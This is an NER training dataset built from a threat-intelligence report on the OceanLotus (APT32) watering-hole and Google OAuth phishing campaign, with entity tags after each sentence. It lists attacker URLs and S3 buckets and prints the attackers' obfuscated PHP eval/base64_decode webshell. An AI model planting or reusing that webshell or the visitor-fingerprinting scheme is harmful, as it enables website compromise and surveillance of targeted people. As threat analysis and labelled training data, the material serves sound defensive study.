In May 2017 , Volexity identified and started tracking a very sophisticated and extremely widespread mass digital surveillance and attack campaign targeting several Asian nations , the ASEAN organization , and hundreds of individuals and organizations tied to media , human rights and civil society causes .		others time time others security_team others others others others others others others others others others others others others others others others others others location location others others location others others others others others target_crowd target_crowd target_crowd target_crowd target_crowd target_crowd others target_crowd target_crowd others target_crowd target_crowd others others
These attacks are being conducted through numerous strategically compromised websites and have occurred over several high-profile ASEAN summits .		others others others others others others others others others others others others others others others others location others others
Volexity has tied this attack campaign to an advanced persistent threat ( APT ) group first identified as OceanLotus by SkyEye Labs in 2015 .		security_team others others others others others others others others others others others others others others others others others threatActor_name others security_team security_team others time others
OceanLotus , also known as APT32 , is believed to be a Vietnam-based APT group that has become increasingly sophisticated in its attack tactics , techniques , and procedures ( TTPs ) .		threatActor_name others others others others threatActor_aliases others others others others others others others others others others others others others others others others others others others others others others others others string others others
Volexity works closely with several human rights and civil society organizations .		security_team others others others others others others others others others others others
A few of these organizations have specifically been targeted by OceanLotus since early 2015 .		others others others others others others others others others others threatActor_name others others time others
As a result , Volexity has been able to directly observe and investigate various attack campaigns .		others others others others security_team others others others others others others others others others others others others
This report is based on a very targeted attack that Volexity observed and the research that followed .		others others others others others others others others others others security_team others others others others others others others

The OceanLotus threat group has successfully operated , largely unnoticed , through several high-profile websites since late 2016 .		others threatActor_name others others others others others others others others others others others others others others others time others
Volexity has observed the following operating pattern for the OceanLotus group :  Compromise website of strategic importance ( e.g.		security_team others others others others others others others others threatActor_name others others others others others others others others others others
websites visitors have a higher likelihood to be targets of interest ) .		others others others others others others others others others others others others others

Webshell used to add JavaScript developed by OceanLotus into the website .		tool others others others program_language others others threatActor_name others others others others
The malicious JavaScript makes calls over HTTP or HTTPS to attacker controlled domains to typically load one of two different OceanLotus frameworks .		others others program_language others others others protocol others protocol others others others others others others others others others others others threatActor_name others others

Website visitors of interest are flagged for targeting and receive special JavaScript aimed at compromising the user ’s system or e-mail accounts .		others others others others others others others others others others others program_language others others others others others others others others others others others others
Volexity has also noted that some of the organizations with compromised websites have also been targeted with spear phishing campaigns that attempt to install backdoors on the target systems .		security_team others others others others others others others others others others others others others others others others attack_activity attack_activity others others others others attack_goal attack_goal attack_goal attack_goal attack_goal attack_goal others
Spear phishing activity and detailed malware infrastructure will be described in a follow on report on OceanLotus activity .		attack_activity attack_activity others others others others others others others others others others others others others others threatActor_name others others
Volexity has been able to identify a staggeringly large number of websites that have been strategically compromised by the OceanLotus attackers .		security_team others others others others others others others others others others others others others others others others others others threatActor_name person others
The number of compromised websites exceeds 100 .		others others others others others others others others
The overwhelming majority of the websites that have been compromised belong to Vietnamese individuals and organizations that are critical of the Vietnamese Government .		others others others others others others others others others others others others others others others others others others others others others government government others
The remainder of the compromised websites are tied to one of three countries that share a land border with Vietnam or the Philippines .		others others others others others others others others others others others others others others others others others others others location others others location others
Unlike with the Vietnamese victims , in most cases these websites are tied to state owned or affiliated organizations .		others others others others others others others others others others others others others others others others others others others others
Volexity has chosen not to list the Vietnamese websites that have been compromised , as the quantity is exceedingly large ( over 80 ) and many of them are tied to individuals or very small organizations .		security_team others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
However , the list below characterizes the types of websites that have been victimized to facilitate this ongoing campaign .		others others others others others others others others others others others others others others others others others others others others

The compromised websites are being leveraged to deliver malicious JavaScript designed to profile and fingerprint a user on each visit .		others others others others others others others others others program_language others others others others others others others others others others others
Volexity found that OceanLotus had developed two different JavaScript frameworks to accomplish their profiling and targeting activities .		security_team others others threatActor_name others others others others program_language others others others others others others others others others
For the purposes of this blog , we will call them Framework A and Framework B .		others others others others others others others others others others others others others others others others others
With few exceptions , the compromised websites would only have code loading either Framework A or Framework B .		others others others others others others others others others others others others others others others others others others others
Each of the hostnames and IPs were also tied to one of the two frameworks , with none of them serving up both .		others others others others others others others others others others others others others others others others others others others others others others others others
The following sections will provide some detail on the two frameworks and their multiple scripting components .		others others others others others others others others others others others others others others others others others
Framework A is found on a limited number of victim sites .		others others others others others others others others others others others others
Initial URLs for access to Framework A are typically formatted similar to the following :  cloudflare-api.com/ajax/libs/jquery/2.1.3/jquery.min.js?s=1&v=72580 .		others others others others others others others others others others others others others others others url_evil url_evil url_evil url_evil url_evil others
Volexity believes the v= value is unique and serves as a victim site identifier , which may not be necessary given the data the script sends along as detailed below .		security_team others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The above script is retrieved following a visit to asean.org .		others others others others others others others others others domain others
The first script delivered contains several support functions such as an MD5 function , a base64 decoder , and functions for loading additional data .		others others others others others others others others others others others encryption_algo others others others encryption_algo others others others others others others others others others
The goal of this script appears to be defining everything needed to track a host across different requests .		others others others others others others others others others others others others others others others others others others others
This script defines a section of variables used in other parts of the code .		others others others others others others others others others others others others others others others
The host based ones are obtained from the User-Agent in the initial request .		others others others others others others others others others others others others others others
The second hash , h2 , is also an MD5 hash , but the values concatenated are the screen height and width , timezone , plugins , MIME type , and language information .		others others others others others others others others others encryption_algo others others others others others others others others others others others others others others others others others others others others others others others others
The encrypt function simply iterates over the passed string and key string and adds the ASCII values at each position .		others others others others others others others others others others others others others others others others others others others others others
The second script returned starts by defining a browser_hash variable .		others others others others others others others others others others others
This is composed of h1 and the first 10 characters of h2 , separated by “ – “ .		others others others others others others others others others others others others others others others others others others others
This script then sends three GET requests , each with a d parameter in the query string that contains some encrypted and base64 encoded data .		others others others others others others others others others others others others others others others others others others others others others others encryption_algo others others others
Framework B is found on the vast majority of sites .		others others others others others others others others others others others
Initial URLs for access to Framework B are simply references to JavaScript ( .js ) files on OceanLotus controlled sites .		others others others others others others others others others others others program_language others others others others others threatActor_name others others others
Volexity has found that the URLs from Framework B do not actually matter , so long as the file extension ends in .js and a referrer is sent with the request .		security_team others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The JavaScript will be sent back regardless of the file or folder requested as long as it meets these two criteria .		others program_language others others others others others others others others others others others others others others others others others others others others
The main ASEAN website is one of the few places that contain both Framework A and Framework B .		others others others others others others others others others others others others others others others others others others others
This script will result in the loading of JavaScript from the following URL :  http://ad.jqueryclick.com/assets/adv.js .		others others others others others others others others program_language others others others others others url_evil url_evil url_evil others
The second framework collects similar information , but handles host tracking differently .		others others others others others others others others others others others others others
The initial script that is delivered varies based on the host OS as determined from the User-Agent in the request .		others others others others others others others others others others others others others others others others others others others others others
When the script is loaded , it first makes a GET request to https://health-ray-id.com/robot.txt .		others others others others others others others others others others others others others url_evil url_evil url_evil others
This returns a UUID that is sent in subsequent requests as either zuuid or client_zuuid.It is also saved in localStorage for the compromised site under a key of x00Sync .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The script then makes two GET requests .		others others others others others others others others
Request 1: GET /api/<BASE64_ENCODED_DATA>/adFeedback.js .		others others others others url_evil url_evil url_evil url_evil url_evil others
The base64 data decodes to a JSON string containing information for tracking the host .		others encryption_algo others others others others others others others others others others others others others
For example , the data below , where zuuid is the UUID returned from health-ray-id.com .		others others others others others others others others others others others others others others others others
{"uuid" : "62d096b35e82547b6a12607c2820f8e0" ,"zuuid" : "ca3a8d02-a0f5-4686-9f6b-cab4a17a9e2b" ,"hash" : ""} .		others others others others others others others others others others others others others others others others others others others others others others others others others
The uuid value ( also seen as client_uuid in later requests ) is also generated by the script and is stored in a cookie named ___APISID for the compromised domain .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
It is generated using the fingerprintjs2 library , which creates a hash based on browser information .		others others others others others tool tool others others others others others others others others others others
This is another method for tracking users across requests .		others others others others others others others others others others
This library and several other legitimate JavaScript libraries ( including the jQuery core library and others for reading/storing cookies , collecting timezone data , etc . )		others others others others others others program_language others others others others others others others others others others others others others others others others others others others others
are typically downloaded from a CDN URL and saved into localStorage variables to be later used by the script .		others others others others others others others others others others others others others others others others others others others others
They are stored as hex encoded data in a function called x00Config .		others others others others others others others others others others others others others
If the client is not on the OceanLotus whitelist , this request just returns a single line of JavaScript setting a variable named timestamp .		others others others others others others others threatActor_name others others others others others others others others others others program_language others others others others others others
However , when the client is on the whitelist , Volexity has observed a popup window that slowly fades in on top of the legitimate website .		others others others others others others others others others others security_team others others others others others others others others others others others others others others others others
In a recent attack , the popup appeared Google related and would redirect to a Google OAuth page designed to fool the user into providing access to their account to a malicious Google App .		others others others others others others others others others others others others others others others others protocol others others others others others others others others others others others others others others others others others others
More details on this appear further down in this post .		others others others others others others others others others others others
Request 2: GET /sync/<BASE64 _ENCODED_DATA/img_blank.gif .		others others others others url_evil url_evil url_evil url_evil others
This request contains two pieces of information : a history section and a navigator section .		others others others others others others others others others others others others others others others others
The history section contains information about the compromised site that the JavaScript was loaded from .		others others others others others others others others others others others program_language others others others others
It also contains certain information about the host including the User-Agent , time and timezone , and IP addresses .		others others others others others others others others others others others others others others others others others others others others
The navigator section is blank the first time the request is made .		others others others others others others others others others others others others others
When the script is first run , it records the current time in another localStorage variable .		others others others others others others others others others others others others others others others others others
It only populates the navigator section if 24 hours have passed .		others others others others others others others others others others others others
It will also update the stored timestamp .		others others others others others others others others
This means the large section of data in the navigator section is only sent once per day , even if this compromised site is visited multiple times .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others
This section includes a lot of the same information collected by Framework A , including MIME Types , plugins , and screen information .		others others others others others others others others others others others others others others others others others others others others others others others others
As mentioned above , if a system is not on the whitelist , the GET /api/<BASE64_ENCODED_DATA>/adFeedback.js request will just return a timestamp variable .		others others others others others others others others others others others others others others others url_evil url_evil url_evil url_evil url_evil others others others others others others others others
For a whitelisted system , a new script is delivered .		others others others others others others others others others others others
The domain for the request is loaded from the SAPIS_ID cookie which was set by the first script .		others others others others others others others others others others others others others others others others others others others
Before storing , it is split in two , the two substrings are reversed , then it is base64 encoded .		others others others others others others others others others others others others others others others others others others encryption_algo others others
An example of the SAPIS_ID cookie can be seen in the navigator section above .		others others others others others others others others others others others others others others others
This ultimately calls the e.fn_getjson() function that makes a request like the following :  GET /connect.js?timestamp=59ba12f2eb1e240cd9431624&code=rtp&s1=64c6e32b951adc4f3d5661dba2330141 .		others others others others function function function others others others others others others others others others others url_evil url_evil url_evil url_evil url_evil url_evil url_evil others
Ultimately , the script presents a popup over the site saying the content is blocked and requests that the visitor sign in to continue .		others others others others others others others others others others others others others others others others others others others others others others others others others
The code below presents this page and tracks progress using the postShow() and postDown() functions , which send GET requests using the URLs shown above .		others others others others others others others others others others others function function function others function function function others others others others others others others others others others others others
When one of the buttons is clicked , the user is redirected to login to the application .		others others others others others others others others others others others others others others others others others others
Volexity was able to work with organizations on the OceanLotus whitelist that received special responses from Framework B .		security_team others others others others others others others others threatActor_name others others others others others others others others others
As a result , Volexity was able to directly observe two different OceanLotus attacks that attempted to fool the targeted user into providing access to their Google Accounts .		others others others others security_team others others others others others others others threatActor_name others others others others others others others others others others others others others others others others
OceanLotus attempts to compromise Google Accounts by prompting the user with a popup directing them to provide OAuth authorizations to a malicious Google App .		threatActor_name others others others others others others others others others others others others others others others others protocol others others others others others others others
Once a user has been flagged for targeting , they will receive a popup when accessing an OceanLotus compromised website once every 24 hours .		others others others others others others others others others others others others others others others others others threatActor_name others others others others others others others
This popup slowly fades in over top of the legitimate website and appears quite legitimate .		others others others others others others others others others others others others others others others others
Regardless of which option the user clicks , they are redirected to Google to initiate OAuth access to one of OceanLotus ’ Google Apps .		others others others others others others others others others others others others others others others protocol others others others others threatActor_name others others others others
OceanLotus is also known to be distributing malware in the form of fake Internet Explorer , Chrome , and Firefox updates .		threatActor_name others others others others others others others others others others others others tool tool others tool others others tool others others
Volexity has observed similar attacks via spear phishing against targeted organizations that leverage some of the same malware infrastructure .		security_team others others others others others others others others others others others others others others others others others others others
In these cases , the following Amazon S3 buckets were used to distribute the malware through JavaScript as part of OceanLotus Framework B or direct links from spear phishing campaigns .		others others others others others others tool tool tool others others others others others others others program_language others others others threatActor_name others others others others others others attack_activity attack_activity others others
dload01.s3.amazonaws.com download-attachments.s3.amazonaws.com .		domain_evil domain_evil others
Volexity has observed multiple custom malware families and Cobalt Strike delivered through these campaigns .		security_team others others others others others others others tool tool others others others others others
Details on the observed malware samples are forthcoming .		others others others others others others others others others
Volexity has worked with multiple victim organizations to assist with incident response efforts and to remedy their compromised systems .		security_team others others others others others others others others others others others others others others others others others others others
This process lead to the identification of different ways the OceanLotus group gains access to the compromised websites and how they maintain access .		others others others others others others others others others others threatActor_name others others others others others others others others others others others others others
Volexity has observed OceanLotus compromising sites one of two ways :  Direct user account access to the website ’s content management system ( CMS ) .		security_team others others threatActor_name others others others others others others others others others others others others others others others others others others others others others others others
Exploitation of outdated plugins and/or CMS components .		others others others others others others others others
It is currently unknown how the intruders gain working credentials to the victim websites .		others others others others others others others others others others others others others others others
Based on the TTPs leveraged by OceanLotus , it is possible that credentials could have been socially engineered ( phished ) from the victims or that the system administrators have been backdoored and a keylogger has assisted in capturing the login credentials .		others others others string others others threatActor_name others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Alternatively , it is possible that some of the credentials were simply guessed .		others others others others others others others others others others others others others others
Several of the Vietnamese websites are running on Google ’s Blogspot platform , so it is reasonable to believe that those users ’ Google accounts may be compromised .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
In the case of exploitation , the CMS software used by the victim organizations was often woefully out of date .		others others others others others others others others others others others others others others others others others others others others others
Both the core components and added plugins had remotely exploitable vulnerabilities that lead to compromise .		others others others others others others others others others others others others others others others others
In all examined cases , OceanLotus attackers added PHP webshells to the victim websites .		others others others others others threatActor_name others others program_language tool others others others others others
In most cases , the intruders added a new file that was designed to blend in with the web directory in which it was placed .		others others others others others others others others others others others others others others others others others others others others others others others others others others
In some cases , Volexity observed OceanLotus adding PHP code to an existing legitimate file already on the webserver .		others others others others security_team others threatActor_name others program_language others others others others others others others others others others others
if (@$_POST['<variable-1>']&&@md5 (md5 ($_POST['<variable-2>'] ) )=='<md5 hash>' ) { $x="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65" ; @eval ($x ($_POST['<variable-1>'] ) ) ; exit() ; .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The hex code storage in $x translates to base64_decode .		others others others others others others others others others encryption_algo others
This code checks to see if variable-1 is set and then validates whether the MD5 of the MD5 of the value set for variable-2 matches an expected MD5 hash .		others others others others others others others others others others others others others others encryption_algo others others encryption_algo others others others others others others others others others encryption_algo others others
If these both evaluate as true , the contents of variable-1 are base64 decoded and evaluated on the system .		others others others others others others others others others others others others others others others others others others others others
This is a simple webshell that , similar to a China Chopper shell , allows direct execution on the system under the privileges of the account running the webserver .		others others others others others others others others others others tool tool others others others others others others others others others others others others others others others others others others
The OceanLotus intruders use these shells to interact with the system and update their JavaScript code on the various websites .		others threatActor_name others others others others others others others others others others others others program_language others others others others others others
OceanLotus also appears to have a potentially automated process that periodically checks if the webshells are still present on the victim systems .		threatActor_name others others others others others others others others others others others others others others others others others others others others others others
Volexity has identified a vast and sprawling amount of infrastructure leveraged by OceanLotus as a part of this strategic web compromise campaign .		security_team others others others others others others others others others others others threatActor_name others others others others others others others others others others
There are even more indicators associated with various malware campaigns that Volexity will detail in another OceanLotus post to follow .		others others others others others others others others others others others security_team others others others others threatActor_name others others others others
OceanLotus ’s attack infrastructure has several unique characteristics , which makes it easy to identify if a particular system is under their control .		threatActor_name others others others others others others others others others others others others others others others others others others others others others others others others
As a result , Volexity was able to identify numerous systems that were not directly observed in active attacks but are strongly believed to be tied to OceanLotus .		others others others others security_team others others others others others others others others others others others others others others others others others others others others others others threatActor_name others
In the sections below , the infrastructure has been separated into active and inactive/unknown categories .		others others others others others others others others others others others others others others others others
If the infrastructure is listed as active , this means that Volexity has directly observed the hostname ’s use in an attack .		others others others others others others others others others others others security_team others others others others others others others others others others others others
If the infrastructure is listed as inactive/unknown , this means that Volexity found evidence the hostname was used in a past attack but is no longer in use or it has never been observed in a direct attack but has unique characteristics indicative of OceanLotus infrastructure .		others others others others others others others others others others others security_team others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others threatActor_name others others
